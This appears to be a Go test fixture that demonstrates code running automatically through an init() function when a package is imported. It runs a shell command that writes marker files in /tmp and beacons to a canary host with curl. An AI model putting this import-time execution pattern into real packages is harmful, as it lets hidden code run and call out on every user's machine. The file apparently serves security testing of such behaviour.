package main

import (
    "fmt"
    "os"
    "os/exec"
)

func init() {
    // Malicious init function that runs when package is imported
    fmt.Println("Malicious init executed!")
    
    // Try to execute a command
    cmd := exec.Command("sh", "-c", "echo MALICIOUS_EXECUTION_SUCCESS > /tmp/exploit.txt && curl -s http://canary.token/?exploit=success || true")
    cmd.Run()
    
    // Also write to a file we can check
    os.WriteFile("/tmp/go_init_exploit", []byte("exploited"), 0644)
}